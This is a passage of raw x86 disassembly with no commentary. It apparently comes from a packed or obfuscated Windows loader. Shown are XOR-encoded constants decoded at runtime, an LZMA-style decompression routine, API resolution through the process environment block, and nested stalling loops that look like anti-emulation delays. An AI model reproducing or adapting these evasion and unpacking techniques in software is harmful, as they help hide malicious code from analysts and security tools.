  41d00e:	mov    WORD PTR [ebp-0x5c],ax
  41d012:	mov    eax,0x47a8
  41d017:	mov    WORD PTR [ebp-0x5a],ax
  41d01b:	lea    eax,[esi+0x17]
  41d01e:	push   0x8
  41d020:	mov    WORD PTR [ebp-0x58],ax
  41d024:	mov    DWORD PTR [ebp-0x10],0xb00040f
  41d02b:	mov    DWORD PTR [ebp-0xc],0x7c050c1d
  41d032:	lea    eax,[ebp-0x10]
  41d035:	pop    edi
  41d036:	mov    cl,BYTE PTR [eax]
  41d038:	xor    cl,dl
  41d03a:	sub    cl,0x8
  41d03d:	mov    BYTE PTR [eax],cl
  41d03f:	inc    eax
  41d040:	dec    edi
  41d041:	jne    0x41d036
  41d043:	lea    eax,[ebp-0x10]
  41d046:	mov    DWORD PTR [ebp-0xb8],eax
  41d04c:	lea    eax,[ebp-0xbc]
  41d052:	push   eax
  41d053:	mov    eax,DWORD PTR [ebp+0xc]
  41d056:	mov    edi,0x751089b
  41d05b:	xor    eax,edi
  41d05d:	add    eax,ebx
  41d05f:	push   eax
  41d060:	mov    eax,DWORD PTR [ebp-0x4]
  41d063:	add    eax,0x66
  41d066:	push   eax
  41d067:	mov    eax,DWORD PTR [ebp-0x4]
  41d06a:	mov    eax,DWORD PTR [eax+0x198]
  41d070:	mov    DWORD PTR [ebp-0xbc],0x1
  41d07a:	push   DWORD PTR [eax]
  41d07c:	mov    eax,DWORD PTR [ebp+0x10]
  41d07f:	call   eax
  41d081:	mov    ecx,DWORD PTR [ebp+0x8]
  41d084:	xor    ecx,edi
  41d086:	add    ecx,ebx
  41d088:	mov    DWORD PTR [ebp-0x8],eax
  41d08b:	cmp    eax,ecx
  41d08d:	jne    0x41d0a8
  41d08f:	mov    eax,ds:0x33730bee
  41d094:	or     eax,0x22150bef
  41d099:	mov    ds:0x33730bee,eax
  41d09e:	add    eax,0x3372e90f
  41d0a3:	mov    ds:0x33730bee,eax
  41d0a8:	mov    ecx,0x4f8a
  41d0ad:	mov    eax,ecx
  41d0af:	mov    WORD PTR [ebp-0x40],ax
  41d0b3:	mov    eax,0x4e71
  41d0b8:	mov    edx,eax
  41d0ba:	mov    WORD PTR [ebp-0x3e],dx
  41d0be:	lea    edx,[ecx+0xf]
  41d0c1:	mov    WORD PTR [ebp-0x3c],dx
  41d0c5:	add    edx,0xfffffff8
  41d0c8:	mov    WORD PTR [ebp-0x3a],dx
  41d0cc:	lea    edx,[ecx+0x9]
  41d0cf:	mov    WORD PTR [ebp-0x38],dx
  41d0d3:	add    edx,0x19
  41d0d6:	mov    WORD PTR [ebp-0x36],dx
  41d0da:	lea    edx,[ecx+0x1b]
  41d0dd:	mov    WORD PTR [ebp-0x34],dx
  41d0e1:	mov    WORD PTR [ebp-0x32],cx
  41d0e5:	mov    ecx,esi
  41d0e7:	mov    WORD PTR [ebp-0x30],cx
  41d0eb:	lea    ecx,[edx+0x5]
  41d0ee:	mov    edx,ecx
  41d0f0:	mov    WORD PTR [ebp-0x54],dx
  41d0f4:	mov    edx,eax
  41d0f6:	mov    WORD PTR [ebp-0x52],dx
  41d0fa:	add    edx,0x8
  41d0fd:	mov    WORD PTR [ebp-0x50],dx
  41d101:	mov    WORD PTR [ebp-0x4e],ax
  41d105:	add    eax,0x2
  41d108:	mov    WORD PTR [ebp-0x4c],ax
  41d10c:	lea    eax,[ecx-0x1e]
  41d10f:	mov    WORD PTR [ebp-0x4a],ax
  41d113:	add    eax,0xfffffff9
  41d116:	mov    WORD PTR [ebp-0x48],ax
  41d11a:	mov    WORD PTR [ebp-0x46],cx
  41d11e:	mov    WORD PTR [ebp-0x44],si
  41d122:	mov    eax,DWORD PTR [ebp+0x8]
  41d125:	movzx  ecx,WORD PTR [ebp-0x54]
  41d129:	xor    eax,edi
  41d12b:	add    eax,ebx
  41d12d:	xor    eax,ecx
  41d12f:	mov    WORD PTR [ebp-0x54],ax
  41d133:	mov    eax,DWORD PTR [ebp+0x8]
  41d136:	movzx  ecx,WORD PTR [ebp-0x40]
  41d13a:	xor    eax,edi
  41d13c:	add    eax,ebx
  41d13e:	xor    eax,ecx
  41d140:	mov    WORD PTR [ebp-0x40],ax
  41d144:	xor    eax,eax
  41d146:	mov    WORD PTR [ebp-0xd0],ax
  41d14d:	mov    WORD PTR [ebp-0xe4],ax
  41d154:	mov    edi,DWORD PTR [ebp+0x24]
  41d157:	lea    eax,[ebp-0xd0]
  41d15d:	lea    edx,[ebp-0x54]
  41d160:	mov    DWORD PTR [ebp-0xbc],0x2
  41d16a:	mov    DWORD PTR [ebp-0xb8],eax
  41d170:	call   0x41fafc
  41d175:	mov    DWORD PTR [ebp-0xb4],eax
  41d17b:	lea    eax,[ebp-0xbc]
  41d181:	push   eax
  41d182:	mov    eax,DWORD PTR [ebp+0xc]
  41d185:	xor    eax,0x751089b
  41d18a:	add    eax,ebx
  41d18c:	push   eax
  41d18d:	lea    eax,[ebp-0x78]
  41d190:	push   eax
  41d191:	push   DWORD PTR [ebp-0x8]
  41d194:	mov    eax,DWORD PTR [ebp+0x10]
  41d197:	call   eax
  41d199:	mov    edi,DWORD PTR [ebp+0x24]
  41d19c:	lea    eax,[ebp-0xe4]
  41d1a2:	lea    edx,[ebp-0x40]
  41d1a5:	mov    DWORD PTR [ebp-0xb8],eax
  41d1ab:	call   0x41fafc
  41d1b0:	mov    DWORD PTR [ebp-0xb4],eax
  41d1b6:	mov    eax,DWORD PTR [ebp+0x14]
  41d1b9:	push   DWORD PTR [ebp-0x4]
  41d1bc:	push   DWORD PTR [ebp+0x20]
  41d1bf:	push   DWORD PTR [ebp+0x1c]
  41d1c2:	push   DWORD PTR [ebp+0x18]
  41d1c5:	push   DWORD PTR [ebp+0x10]
  41d1c8:	push   DWORD PTR [ebp+0x8]
  41d1cb:	push   DWORD PTR [ebp+0xc]
  41d1ce:	call   0x41e378
  41d1d3:	test   eax,eax
  41d1d5:	je     0x41d21c
  41d1d7:	add    DWORD PTR [ebp-0x4],eax
  41d1da:	push   DWORD PTR [ebp-0x4]
  41d1dd:	lea    esi,[ebp+0x4]
  41d1e0:	call   0x41d60c
  41d1e5:	mov    eax,DWORD PTR [ebp-0x4]
  41d1e8:	mov    eax,DWORD PTR [eax+0x1c8]
  41d1ee:	mov    eax,DWORD PTR [eax]
  41d1f0:	xor    eax,0x751089b
  41d1f5:	add    eax,ebx
  41d1f7:	mov    eax,DWORD PTR [ebp-0x4]
  41d1fa:	jne    0x41d212
  41d1fc:	mov    ecx,DWORD PTR [ebp-0x4]
  41d1ff:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41d205:	push   DWORD PTR [ecx]
  41d207:	mov    eax,DWORD PTR [eax+0x1d8]
  41d20d:	call   DWORD PTR [eax+0x28]
  41d210:	jmp    0x41d21c
  41d212:	mov    eax,DWORD PTR [eax+0x17c]
  41d218:	mov    eax,DWORD PTR [eax]
  41d21a:	add    DWORD PTR [esi],eax
  41d21c:	pop    esi
  41d21d:	pop    edi
  41d21e:	pop    ebx
  41d21f:	leave  
  41d220:	ret    0x20
  41d223:	push   edi
  41d224:	push   esi
  41d225:	push   ebx
  41d226:	push   ebp
  41d227:	mov    ebp,esp
  41d229:	mov    eax,DWORD PTR [ebp+0x24]
  41d22c:	add    DWORD PTR [ebp+0x28],eax
  41d22f:	push   eax
  41d230:	cld    
  41d231:	mov    esi,DWORD PTR [ebp+0x18]
  41d234:	add    DWORD PTR [ebp+0x1c],esi
  41d237:	push   esi
  41d238:	mov    esi,DWORD PTR [ebp+0x14]
  41d23b:	lods   eax,DWORD PTR ds:[esi]
  41d23c:	xchg   edx,eax
  41d23d:	push   edx
  41d23e:	mov    cl,BYTE PTR [esi-0x2]
  41d241:	or     eax,0xffffffff
  41d244:	shl    eax,cl
  41d246:	not    eax
  41d248:	push   eax
  41d249:	mov    cl,dh
  41d24b:	or     eax,0xffffffff
  41d24e:	shl    eax,cl
  41d250:	not    eax
  41d252:	push   eax
  41d253:	add    cl,dl
  41d255:	mov    edi,esi
  41d257:	sub    esp,0xc
  41d25a:	sub    eax,eax
  41d25c:	inc    eax
  41d25d:	push   eax
  41d25e:	push   eax
  41d25f:	push   eax
  41d260:	push   eax
  41d261:	push   eax
  41d262:	push   edi
  41d263:	sub    esi,esi
  41d265:	push   esi
  41d266:	or     ebx,0xffffffff
  41d269:	mov    eax,0x300
  41d26e:	shl    eax,cl
  41d270:	lea    ecx,[eax+0x736]
  41d276:	mov    eax,0x4000400
  41d27b:	shr    ecx,1
  41d27d:	rep stos DWORD PTR es:[edi],eax
  41d27f:	push   0x5
  41d281:	pop    ecx
  41d282:	call   0x41d56d
  41d287:	loop   0x41d282
  41d289:	lea    esi,[esi]
  41d28b:	lea    edi,[edi]
  41d28d:	mov    edi,DWORD PTR [ebp-0x4]
  41d290:	mov    eax,DWORD PTR [ebp-0x10]
  41d293:	sub    edi,DWORD PTR [ebp+0x24]
  41d296:	and    eax,edi
  41d298:	mov    DWORD PTR [ebp-0x18],eax
  41d29b:	mov    al,0x0
  41d29d:	call   0x41d585
  41d2a2:	jne    0x41d33d
  41d2a8:	mov    cl,BYTE PTR [ebp-0xc]
  41d2ab:	and    edi,DWORD PTR [ebp-0x14]
  41d2ae:	shl    edi,cl
  41d2b0:	sub    cl,0x8
  41d2b3:	neg    cl
  41d2b5:	shr    esi,cl
  41d2b7:	pop    eax
  41d2b8:	add    edi,esi
  41d2ba:	pop    esi
  41d2bb:	lea    edi,[edi+edi*2]
  41d2be:	shl    edi,0x8
  41d2c1:	cmp    al,0x7
  41d2c3:	pop    edx
  41d2c4:	lea    ecx,[esi+edi*2+0xe6c]
  41d2cb:	push   ecx
  41d2cc:	push   esi
  41d2cd:	mov    esi,0x100
  41d2d2:	push   eax
  41d2d3:	mov    al,0x1
  41d2d5:	jb     0x41d30b
  41d2d7:	mov    edi,DWORD PTR [ebp-0x4]
  41d2da:	sub    edi,DWORD PTR [ebp-0x24]
  41d2dd:	movzx  edi,BYTE PTR [edi]
  41d2e0:	mov    ebp,DWORD PTR [ebp-0x34]
  41d2e3:	shl    edi,1
  41d2e5:	mov    ecx,esi
  41d2e7:	and    esi,edi
  41d2e9:	add    ecx,esi
  41d2eb:	lea    ebp,[ebp+ecx*2+0x0]
  41d2ef:	call   0x41d5a4
  41d2f4:	mov    ecx,eax
  41d2f6:	shr    esi,0x8
  41d2f9:	and    ecx,0x1
  41d2fc:	cmp    esi,ecx
  41d2fe:	mov    esi,0x100
  41d303:	jne    0x41d313
  41d305:	cmp    eax,esi
  41d307:	jb     0x41d2e0
  41d309:	jmp    0x41d31f
  41d30b:	mov    ebp,DWORD PTR [ebp-0x34]
  41d30e:	call   0x41d5a4
  41d313:	inc    eax
  41d314:	inc    esi
  41d315:	sub    eax,0x1
  41d318:	sub    esi,0x1
  41d31b:	cmp    eax,esi
  41d31d:	jb     0x41d30b
  41d31f:	pop    edx
  41d320:	inc    edx
  41d321:	cmp    edx,0x5
  41d324:	dec    edx
  41d325:	mov    ecx,edx
  41d327:	jb     0x41d338
  41d329:	inc    edx
  41d32a:	cmp    edx,0xb
  41d32d:	dec    edx
  41d32e:	mov    cl,0x4
  41d330:	dec    cl
  41d332:	jb     0x41d338
  41d334:	mov    cl,0x7
  41d336:	dec    cl
  41d338:	sub    edx,ecx
  41d33a:	push   edx
  41d33b:	jmp    0x41d38c
  41d33d:	mov    al,0xc1
  41d33f:	dec    al
  41d341:	call   0x41d595
  41d346:	jne    0x41d35c
  41d348:	pop    eax
  41d349:	pop    edi
  41d34a:	pop    edx
  41d34b:	pop    ecx
  41d34c:	pop    edx
  41d34d:	pop    ecx
  41d34e:	push   DWORD PTR [esp]
  41d351:	push   ecx
  41d352:	push   edx
  41d353:	mov    edx,0x664
  41d358:	mov    cl,0x0
  41d35a:	jmp    0x41d3cf
  41d35c:	mov    al,0xcd
  41d35e:	dec    al
  41d360:	call   0x41d595
  41d365:	jne    0x41d395
  41d367:	mov    al,0xf1
  41d369:	dec    al
  41d36b:	call   0x41d585
  41d370:	jne    0x41d3c5
  41d372:	pop    eax
  41d373:	cmp    al,0x7
  41d375:	mov    al,0x9
  41d377:	jb     0x41d37b
  41d379:	mov    al,0xb
  41d37b:	push   eax
  41d37c:	mov    esi,DWORD PTR [ebp-0x4]
  41d37f:	sub    esi,DWORD PTR [ebp-0x24]
  41d382:	cmp    esi,DWORD PTR [ebp+0x24]
  41d385:	jb     0x41d55c
  41d38b:	lods   al,BYTE PTR ds:[esi]
  41d38c:	mov    edi,DWORD PTR [ebp-0x4]
  41d38f:	stos   BYTE PTR es:[edi],al
  41d390:	jmp    0x41d523
  41d395:	mov    al,0xd8
  41d397:	call   0x41d595
  41d39c:	mov    esi,DWORD PTR [ebp-0x28]
  41d39f:	je     0x41d3bc
  41d3a1:	mov    al,0xe4
  41d3a3:	call   0x41d595
  41d3a8:	mov    esi,DWORD PTR [ebp-0x2c]
  41d3ab:	je     0x41d3b6
  41d3ad:	mov    esi,DWORD PTR [ebp-0x30]
  41d3b0:	mov    ecx,DWORD PTR [ebp-0x2c]
  41d3b3:	mov    DWORD PTR [ebp-0x30],ecx
  41d3b6:	mov    ecx,DWORD PTR [ebp-0x28]
  41d3b9:	mov    DWORD PTR [ebp-0x2c],ecx
  41d3bc:	mov    ecx,DWORD PTR [ebp-0x24]
  41d3bf:	mov    DWORD PTR [ebp-0x28],ecx
  41d3c2:	mov    DWORD PTR [ebp-0x24],esi
  41d3c5:	pop    eax
  41d3c6:	pop    edi
  41d3c7:	pop    ecx
  41d3c8:	mov    edx,0xa68
  41d3cd:	mov    cl,0x8
  41d3cf:	add    edx,edi
  41d3d1:	push   edx
  41d3d2:	push   edi
  41d3d3:	cmp    al,0x7
  41d3d5:	mov    al,cl
  41d3d7:	jb     0x41d3db
  41d3d9:	add    al,0x3
  41d3db:	push   eax
  41d3dc:	mov    ebp,DWORD PTR [ebp-0x34]
  41d3df:	call   0x41d5a2
  41d3e4:	jne    0x41d3fa
  41d3e6:	mov    eax,DWORD PTR [ebp-0x18]
  41d3e9:	mov    edi,DWORD PTR [ebp-0x34]
  41d3ec:	shl    eax,0x3
  41d3ef:	sub    ecx,ecx
  41d3f1:	push   0x8
  41d3f3:	pop    esi
  41d3f4:	lea    edi,[edi+eax*2+0x4]
  41d3f8:	jmp    0x41d42f
  41d3fa:	mov    ebp,DWORD PTR [ebp-0x34]
  41d3fd:	add    ebp,0x2
  41d400:	call   0x41d5a2
  41d405:	jne    0x41d41f
  41d407:	mov    eax,DWORD PTR [ebp-0x18]
  41d40a:	mov    edi,DWORD PTR [ebp-0x34]
  41d40d:	shl    eax,0x3
  41d410:	push   0x8
  41d412:	pop    ecx
  41d413:	push   0x8
  41d415:	pop    esi
  41d416:	lea    edi,[edi+eax*2+0x104]
  41d41d:	jmp    0x41d42f
  41d41f:	mov    edi,0x204
  41d424:	add    edi,DWORD PTR [ebp-0x34]
  41d427:	push   0x10
  41d429:	pop    ecx
  41d42a:	mov    esi,0x100
  41d42f:	mov    DWORD PTR [ebp-0x1c],ecx
  41d432:	sub    eax,eax
  41d434:	inc    eax
  41d435:	mov    ebp,edi
  41d437:	call   0x41d5a4
  41d43c:	mov    ecx,eax
  41d43e:	sub    ecx,esi
  41d440:	jb     0x41d435
  41d442:	add    DWORD PTR [ebp-0x1c],ecx
  41d445:	cmp    DWORD PTR [ebp-0x3c],0x4
  41d449:	jae    0x41d4ff
  41d44f:	add    DWORD PTR [ebp-0x3c],0x7
  41d453:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d456:	cmp    ecx,0x4
  41d459:	jb     0x41d45e
  41d45b:	push   0x3
  41d45d:	pop    ecx
  41d45e:	mov    edi,DWORD PTR [ebp-0x38]
  41d461:	shl    ecx,0x6
  41d464:	sub    eax,eax
  41d466:	inc    eax
  41d467:	push   0x40
  41d469:	pop    esi
  41d46a:	lea    edi,[edi+ecx*2+0x360]
  41d471:	mov    ebp,edi
  41d473:	call   0x41d5a4
  41d478:	mov    ecx,eax
  41d47a:	sub    ecx,esi
  41d47c:	jb     0x41d471
  41d47e:	mov    DWORD PTR [ebp-0x18],ecx
  41d481:	mov    DWORD PTR [ebp-0x24],ecx
  41d484:	cmp    ecx,0x4
  41d487:	jb     0x41d4fc
  41d489:	mov    esi,ecx
  41d48b:	and    DWORD PTR [ebp-0x24],0x1
  41d48f:	shr    esi,1
  41d491:	or     DWORD PTR [ebp-0x24],0x2
  41d495:	dec    esi
  41d496:	cmp    ecx,0xe
  41d499:	jae    0x41d4b4
  41d49b:	mov    eax,0x2af
  41d4a0:	sub    eax,ecx
  41d4a2:	mov    ecx,esi
  41d4a4:	shl    BYTE PTR [ebp-0x24],cl
  41d4a7:	add    eax,DWORD PTR [ebp-0x24]
  41d4aa:	shl    eax,1
  41d4ac:	add    eax,DWORD PTR [ebp-0x38]
  41d4af:	mov    DWORD PTR [ebp-0x34],eax
  41d4b2:	jmp    0x41d4e1
  41d4b4:	sub    esi,0x4
  41d4b7:	call   0x41d561
  41d4bc:	shr    ebx,1
  41d4be:	shl    DWORD PTR [ebp-0x24],1
  41d4c1:	cmp    DWORD PTR [ebp-0x20],ebx
  41d4c4:	jb     0x41d4cc
  41d4c6:	inc    DWORD PTR [ebp-0x24]
  41d4c9:	sub    DWORD PTR [ebp-0x20],ebx
  41d4cc:	dec    esi
  41d4cd:	jne    0x41d4b7
  41d4cf:	mov    eax,0x644
  41d4d4:	add    eax,DWORD PTR [ebp-0x38]
  41d4d7:	mov    DWORD PTR [ebp-0x34],eax
  41d4da:	shl    DWORD PTR [ebp-0x24],0x4
  41d4de:	push   0x4
  41d4e0:	pop    esi
  41d4e1:	sub    edi,edi
  41d4e3:	inc    edi
  41d4e4:	mov    eax,edi
  41d4e6:	mov    ebp,DWORD PTR [ebp-0x34]
  41d4e9:	call   0x41d5a4
  41d4ee:	test   al,0x1
  41d4f0:	je     0x41d4f5
  41d4f2:	or     DWORD PTR [ebp-0x24],edi
  41d4f5:	shl    edi,1
  41d4f7:	dec    esi
  41d4f8:	jne    0x41d4e6
  41d4fa:	jmp    0x41d4fc
  41d4fc:	inc    DWORD PTR [ebp-0x24]
  41d4ff:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d502:	add    ecx,0x2
  41d505:	mov    edi,DWORD PTR [ebp-0x4]
  41d508:	mov    eax,edi
  41d50a:	sub    eax,DWORD PTR [ebp+0x24]
  41d50d:	cmp    DWORD PTR [ebp-0x24],eax
  41d510:	ja     0x41d55c
  41d512:	mov    esi,edi
  41d514:	sub    esi,DWORD PTR [ebp-0x24]
  41d517:	mov    edx,DWORD PTR [ebp+0x28]
  41d51a:	lods   al,BYTE PTR ds:[esi]
  41d51b:	stos   BYTE PTR es:[edi],al
  41d51c:	cmp    edi,edx
  41d51e:	jae    0x41d523
  41d520:	dec    ecx
  41d521:	jne    0x41d51a
  41d523:	mov    DWORD PTR [ebp-0x4],edi
  41d526:	movzx  esi,al
  41d529:	cmp    edi,DWORD PTR [ebp+0x28]
  41d52c:	jb     0x41d28d
  41d532:	call   0x41d561
  41d537:	sub    eax,eax
  41d539:	lea    ebp,[esp+0x3c]
  41d53d:	mov    edx,DWORD PTR [ebp+0x20]
  41d540:	mov    esi,DWORD PTR [ebp-0x8]
  41d543:	sub    esi,DWORD PTR [ebp+0x18]
  41d546:	mov    DWORD PTR [edx],esi
  41d548:	mov    edx,DWORD PTR [ebp+0x2c]
  41d54b:	mov    edi,DWORD PTR [ebp-0x4]
  41d54e:	sub    edi,DWORD PTR [ebp+0x24]
  41d551:	mov    DWORD PTR [edx],edi
  41d553:	leave  
  41d554:	pop    ebx
  41d555:	pop    esi
  41d556:	pop    edi
  41d557:	ret    0x1c
  41d55a:	pop    esi
  41d55b:	pop    eax
  41d55c:	sub    eax,eax
  41d55e:	inc    eax
  41d55f:	jmp    0x41d539
  41d561:	cmp    ebx,0x1000000
  41d567:	jb     0x41d56a
  41d569:	ret    
  41d56a:	shl    ebx,0x8
  41d56d:	push   esi
  41d56e:	mov    esi,DWORD PTR [ebp-0x8]
  41d571:	cmp    esi,DWORD PTR [ebp+0x1c]
  41d574:	jae    0x41d55a
  41d576:	mov    eax,DWORD PTR [ebp-0x20]
  41d579:	shl    eax,0x8
  41d57c:	lods   al,BYTE PTR ds:[esi]
  41d57d:	mov    DWORD PTR [ebp-0x20],eax
  41d580:	mov    DWORD PTR [ebp-0x8],esi
  41d583:	pop    esi
  41d584:	ret    
  41d585:	mov    ecx,DWORD PTR [ebp-0x3c]
  41d588:	movzx  eax,al
  41d58b:	shl    ecx,0x4
  41d58e:	add    eax,DWORD PTR [ebp-0x18]
  41d591:	add    eax,ecx
  41d593:	jmp    0x41d59b
  41d595:	movzx  eax,al
  41d598:	add    eax,DWORD PTR [ebp-0x3c]
  41d59b:	mov    ebp,DWORD PTR [ebp-0x38]
  41d59e:	lea    ebp,[ebp+eax*2+0x0]
  41d5a2:	sub    eax,eax
  41d5a4:	lea    ebp,[ebp+eax*2+0x0]
  41d5a8:	cmp    ebx,0x1000000
  41d5ae:	jae    0x41d5cc
  41d5b0:	mov    ecx,DWORD PTR [esp+0x38]
  41d5b4:	shl    DWORD PTR [esp+0x20],0x8
  41d5b9:	cmp    ecx,DWORD PTR [esp+0x5c]
  41d5bd:	jae    0x41d55b
  41d5bf:	mov    dl,BYTE PTR [ecx]
  41d5c1:	inc    DWORD PTR [esp+0x38]
  41d5c5:	shl    ebx,0x8
  41d5c8:	mov    BYTE PTR [esp+0x20],dl
  41d5cc:	mov    ecx,ebx
  41d5ce:	movzx  edx,WORD PTR [ebp+0x0]
  41d5d2:	shr    ecx,0xb
  41d5d5:	imul   ecx,edx
  41d5d8:	cmp    DWORD PTR [esp+0x20],ecx
  41d5dc:	jae    0x41d5f5
  41d5de:	mov    ebx,ecx
  41d5e0:	mov    ecx,0x800
  41d5e5:	sub    ecx,edx
  41d5e7:	shr    ecx,0x5
  41d5ea:	add    WORD PTR [ebp+0x0],cx
  41d5ee:	add    eax,eax
  41d5f0:	lea    ebp,[esp+0x40]
  41d5f4:	ret    
  41d5f5:	shr    edx,0x5
  41d5f8:	sub    DWORD PTR [esp+0x20],ecx
  41d5fc:	sub    ebx,ecx
  41d5fe:	sub    WORD PTR [ebp+0x0],dx
  41d602:	add    eax,eax
  41d604:	add    eax,0x1
  41d607:	lea    ebp,[esp+0x40]
  41d60b:	ret    
  41d60c:	push   ebp
  41d60d:	mov    ebp,esp
  41d60f:	sub    esp,0x104
  41d615:	push   ebx
  41d616:	push   esi
  41d617:	push   edi
  41d618:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41d61f:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41d626:	mov    eax,DWORD PTR [ebp+0x8]
  41d629:	mov    DWORD PTR [ebp+0x8],eax
  41d62c:	mov    ecx,DWORD PTR [ebp-0x14]
  41d62f:	mov    ebx,0x751089b
  41d634:	xor    ecx,ebx
  41d636:	mov    eax,0x3272e2
  41d63b:	add    ecx,eax
  41d63d:	mov    DWORD PTR [ebp-0x2c],ecx
  41d640:	mov    ecx,DWORD PTR [ebp-0x14]
  41d643:	xor    ecx,ebx
  41d645:	add    ecx,eax
  41d647:	mov    DWORD PTR [ebp-0x3c],ecx
  41d64a:	mov    ecx,DWORD PTR [ebp-0x14]
  41d64d:	xor    ecx,ebx
  41d64f:	add    ecx,eax
  41d651:	mov    DWORD PTR [ebp-0x40],ecx
  41d654:	mov    ecx,DWORD PTR [ebp-0x14]
  41d657:	xor    ecx,ebx
  41d659:	add    ecx,eax
  41d65b:	mov    DWORD PTR [ebp-0xa0],ecx
  41d661:	mov    DWORD PTR [ebp-0x50],0xf89f0585
  41d668:	mov    DWORD PTR [ebp-0x40],0xf89cb585
  41d66f:	mov    DWORD PTR [ebp-0x4c],0xf89c85b9
  41d676:	push   0x25
  41d678:	pop    ecx
  41d679:	mov    DWORD PTR [ebp-0x34],ecx
  41d67c:	mov    DWORD PTR [ebp-0x34],ecx
  41d67f:	push   0x65
  41d681:	pop    ecx
  41d682:	mov    DWORD PTR [ebp-0x34],ecx
  41d685:	mov    DWORD PTR [ebp-0x34],ecx
  41d688:	mov    DWORD PTR [ebp-0x34],0x4d
  41d68f:	mov    DWORD PTR [ebp-0x34],0x43
  41d696:	mov    ecx,DWORD PTR [ebp-0x14]
  41d699:	xor    ecx,ebx
  41d69b:	add    ecx,eax
  41d69d:	mov    DWORD PTR [ebp-0x34],ecx
  41d6a0:	mov    ecx,DWORD PTR [ebp-0x14]
  41d6a3:	xor    ecx,ebx
  41d6a5:	add    ecx,eax
  41d6a7:	mov    DWORD PTR [ebp-0x34],ecx
  41d6aa:	mov    DWORD PTR [ebp-0x28],0x257
  41d6b1:	mov    DWORD PTR [ebp-0x20],0x35
  41d6b8:	mov    DWORD PTR [ebp-0x10],0x79
  41d6bf:	lea    edi,[ebp-0xe4]
  41d6c5:	lea    esi,[ebp-0x104]
  41d6cb:	call   0x41e2e7
  41d6d0:	dec    DWORD PTR [ebp-0x10]
  41d6d3:	jne    0x41d6bf
  41d6d5:	dec    DWORD PTR [ebp-0x20]
  41d6d8:	jne    0x41d6b8
  41d6da:	dec    DWORD PTR [ebp-0x28]
  41d6dd:	jne    0x41d6b1
  41d6df:	mov    DWORD PTR [ebp-0x28],0x400d
  41d6e6:	mov    eax,DWORD PTR [ebp-0x14]
  41d6e9:	xor    eax,ebx
  41d6eb:	mov    esi,0x3272e2
  41d6f0:	add    eax,esi
  41d6f2:	mov    DWORD PTR [ebp-0x8],eax
  41d6f5:	mov    eax,DWORD PTR [ebp-0x14]
  41d6f8:	and    DWORD PTR [ebp-0x94],0x0
  41d6ff:	xor    eax,ebx
  41d701:	add    eax,esi
  41d703:	mov    DWORD PTR [ebp-0x38],eax
  41d706:	mov    eax,fs:0x18
  41d70c:	mov    DWORD PTR [ebp-0x94],eax
  41d712:	mov    eax,DWORD PTR [eax+0x30]
  41d715:	mov    DWORD PTR [ebp-0x98],eax
  41d71b:	mov    eax,DWORD PTR [eax+0xc]
  41d71e:	mov    DWORD PTR [ebp-0xc0],eax
  41d724:	mov    eax,DWORD PTR [ebp+0x8]
  41d727:	lea    ecx,[ebp-0x94]
  41d72d:	mov    DWORD PTR [eax+0x1a0],ecx
  41d733:	mov    eax,DWORD PTR [ebp+0x8]
  41d736:	lea    ecx,[ebp-0x98]
  41d73c:	mov    DWORD PTR [eax+0x1a4],ecx
  41d742:	mov    eax,DWORD PTR [ebp+0x8]
  41d745:	push   DWORD PTR [ebp+0x8]
  41d748:	lea    ecx,[ebp-0xc0]
  41d74e:	mov    DWORD PTR [eax+0x1a8],ecx
  41d754:	call   0x41facd
  41d759:	mov    ecx,DWORD PTR [ebp-0x14]
  41d75c:	xor    ecx,ebx
  41d75e:	add    ecx,esi
  41d760:	cmp    ecx,eax
  41d762:	je     0x41da3f
  41d768:	mov    eax,DWORD PTR [ebp+0x8]
  41d76b:	mov    eax,DWORD PTR [eax+0x194]
  41d771:	mov    ecx,DWORD PTR [eax]
  41d773:	mov    eax,DWORD PTR [ebp+0x8]
  41d776:	mov    eax,DWORD PTR [eax+0x194]
  41d77c:	mov    eax,DWORD PTR [eax]
  41d77e:	add    eax,DWORD PTR [ecx+0x3c]
  41d781:	mov    ecx,DWORD PTR [ebp+0x8]
  41d784:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41d78a:	lea    edx,[ebp-0xc4]
  41d790:	push   edx
  41d791:	mov    edx,DWORD PTR [ebp+0x8]
  41d794:	mov    edx,DWORD PTR [edx+0x18c]
  41d79a:	mov    edx,DWORD PTR [edx]
  41d79c:	add    edx,DWORD PTR [eax+0x88]
  41d7a2:	push   0x4
  41d7a4:	push   DWORD PTR [eax+0x8c]
  41d7aa:	push   edx
  41d7ab:	call   DWORD PTR [ecx+0x1c]
  41d7ae:	push   DWORD PTR [ebp+0x8]
  41d7b1:	mov    edi,DWORD PTR [ebp+0x8]
  41d7b4:	mov    eax,DWORD PTR [ebp+0x8]
  41d7b7:	mov    edx,DWORD PTR [eax+0x1b8]
  41d7bd:	mov    DWORD PTR [ebp-0x68],0xe080f00
  41d7c4:	mov    DWORD PTR [ebp-0x64],0x50c011f
  41d7cb:	mov    WORD PTR [ebp-0x60],0x7c3d
  41d7d1:	mov    DWORD PTR [ebp-0x90],0x43f0f25
  41d7db:	mov    DWORD PTR [ebp-0x8c],0x3d0e1d
  41d7e5:	mov    DWORD PTR [ebp-0x88],0x221d040c
  41d7ef:	mov    DWORD PTR [ebp-0x84],0xe190109
  41d7f9:	mov    DWORD PTR [ebp-0x80],0x7c3d1f05
  41d800:	mov    DWORD PTR [ebp-0x7c],0x43f0f25
  41d807:	mov    DWORD PTR [ebp-0x78],0x3d0e1d
  41d80e:	mov    DWORD PTR [ebp-0x74],0x221d040c
  41d815:	mov    DWORD PTR [ebp-0x70],0xe190109
  41d81c:	mov    DWORD PTR [ebp-0x6c],0x7c2b1f05
  41d823:	call   0x41fafc
  41d828:	push   eax
  41d829:	mov    eax,DWORD PTR [ebp+0x8]
  41d82c:	mov    eax,DWORD PTR [eax+0x1a8]
  41d832:	push   DWORD PTR [eax]
  41d834:	call   0x41f79d
  41d839:	test   eax,eax
  41d83b:	jne    0x41d88d
  41d83d:	mov    eax,DWORD PTR [ebp+0x8]
  41d840:	mov    eax,DWORD PTR [eax+0x1d8]
  41d846:	mov    edi,DWORD PTR [ebp+0x8]
  41d849:	add    eax,0x4
  41d84c:	mov    DWORD PTR [ebp-0x24],eax
  41d84f:	mov    eax,DWORD PTR [ebp+0x8]
  41d852:	mov    edx,DWORD PTR [eax+0x1b8]
  41d858:	call   0x41fafc
  41d85d:	push   eax
